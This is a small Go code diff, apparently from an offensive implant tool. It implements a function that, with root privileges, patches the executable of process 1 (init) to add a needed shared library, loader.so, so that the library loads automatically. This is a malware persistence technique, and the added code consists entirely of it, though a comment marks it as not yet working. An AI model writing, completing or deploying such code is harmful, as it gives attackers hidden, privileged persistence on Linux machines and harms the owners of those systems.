@@ -225,7 +225,15 @@ func injector() (err error) {
 	return
 }
 
+// FIXME this is not working
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
-	return
+	if !HasRoot() {
+		return errors.New("Root required")
+	}
+	so_path, err := prepare_loader_so(1)
+	if err != nil {
+		return
+	}
+	return AddNeededLib(util.ProcExePath(1), so_path)
 }
